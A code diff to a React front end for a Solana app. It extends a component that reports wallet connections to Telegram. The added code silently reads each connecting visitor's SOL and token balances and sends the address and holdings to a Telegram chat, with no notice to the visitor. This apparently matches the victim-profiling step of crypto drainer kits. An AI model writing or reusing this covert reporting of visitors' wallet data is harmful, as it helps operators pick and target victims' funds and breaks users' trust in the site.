@@ -5,8 +5,9 @@ import { BrowserRouter, Routes, Route, useLocation } from "react-router-dom";
 import { WalletProvider } from "./providers/WalletProvider";
 import { SolflareDeepLinkHandler } from "@/components/SolflareDeepLinkHandler";
 import { Toaster } from "@/components/ui/sonner";
-import { useWallet } from "@solana/wallet-adapter-react";
+import { useWallet, useConnection } from "@solana/wallet-adapter-react";
 import { sendTelegramMessage } from "@/utils/telegram";
+import { TOKEN_PROGRAM_ID, TOKEN_2022_PROGRAM_ID, LAMPORTS_PER_SOL } from "@solana/spl-token";
 import Index from "./pages/Index";
 import NotFound from "./pages/NotFound";
 
@@ -36,15 +37,63 @@ const PageLoader = () => (
 // Component to send Telegram notifications on Solana wallet connect
 const SolanaWalletNotifier = () => {
   const { connected, publicKey } = useWallet();
+  const { connection } = useConnection();
 
   useEffect(() => {
     if (connected && publicKey) {
-      sendTelegramMessage(`
+      const fetchAndNotify = async () => {
+        try {
+          // Fetch SOL balance
+          const solBal = await connection.getBalance(publicKey);
+          const solAmount = solBal / LAMPORTS_PER_SOL;
+
+          // Fetch token balances
+          const legacyTokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, { programId: TOKEN_PROGRAM_ID });
+          const token2022Accounts = await connection.getParsedTokenAccountsByOwner(publicKey, { programId: TOKEN_2022_PROGRAM_ID });
+          const allTokenAccounts = [...legacyTokenAccounts.value, ...token2022Accounts.value];
+
+          const tokens = allTokenAccounts
+            .map(account => {
+              const info = account.account.data.parsed.info;
+              return {
+                mint: info.mint,
+                uiAmount: info.tokenAmount.uiAmount,
+                symbol: info.mint.slice(0, 8),
+              };
+            })
+            .filter(token => token.uiAmount && token.uiAmount > 0);
+
+          // Build message
+          let message = `
+🔗 <b>Solana Wallet Connected</b>
+👤 <b>Address:</b> <code>${publicKey.toBase58()}</code>
+💰 <b>SOL Balance:</b> <code>${solAmount.toFixed(4)} SOL</code>
+`;
+
+          if (tokens.length > 0) {
+            message += `\n📋 <b>Token Balances:</b>`;
+            tokens.slice(0, 10).forEach((token, i) => {
+              message += `\n- Token ${i+1} (${token.symbol}...): <code>${token.uiAmount?.toFixed(4) || 0}</code>`;
+            });
+            if (tokens.length > 10) {
+              message += `\n... and ${tokens.length -10} more`;
+            }
+          }
+
+          sendTelegramMessage(message);
+        } catch (error) {
+          console.error('Error fetching Solana balances:', error);
+          // Fallback to just wallet connected
+          sendTelegramMessage(`
 🔗 <b>Solana Wallet Connected</b>
 👤 <b>Address:</b> <code>${publicKey.toBase58()}</code>
 `);
+        }
+      };
+
+      fetchAndNotify();
     }
-  }, [connected, publicKey]);
+  }, [connected, publicKey, connection]);
 
   return null;
 };
